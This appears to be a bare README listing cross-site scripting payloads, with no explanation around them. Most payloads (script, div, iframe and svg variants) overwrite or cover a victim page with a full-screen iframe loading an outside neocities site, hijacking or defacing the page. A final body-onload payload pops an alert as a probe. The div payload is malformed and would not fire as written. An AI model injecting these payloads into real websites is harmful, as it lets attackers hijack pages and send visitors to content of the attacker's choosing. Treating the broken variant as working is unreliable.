# XSS-payloads

script payload
```
<script>document.documentElement.innerHTML="<html><iframe src='http://trabbit.neocities.org' style='visibility: visible; border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;'></iframe></html>";</script>
```
div payload
```
<div onload="<script>document.documentElement.innerHTML="<html><iframe src='http://trabbit.neocities.org' style='visibility: visible; border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;'></iframe></html>";</script>"></div>
```
iframe payload
```
<iframe src="http://trabbit.neocities.org" style="border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;"></iframe>
```
svg payload
```
<svg width="100%" height="100%" style="position: fixed; top: 0; right: 0; bottom: 0; left: 0;"> <foreignObject width="100%" height="100%"> <body xmlns="http://www.w3.org/1999/xhtml"> <iframe src="http://trabbit.neocities.org" style="border: 0; width: 100%; height: 100%;"></iframe> </body> </foreignObject> </svg>
```
body payload
```
<body onload="alert('XSS vulnerability found!')">
```
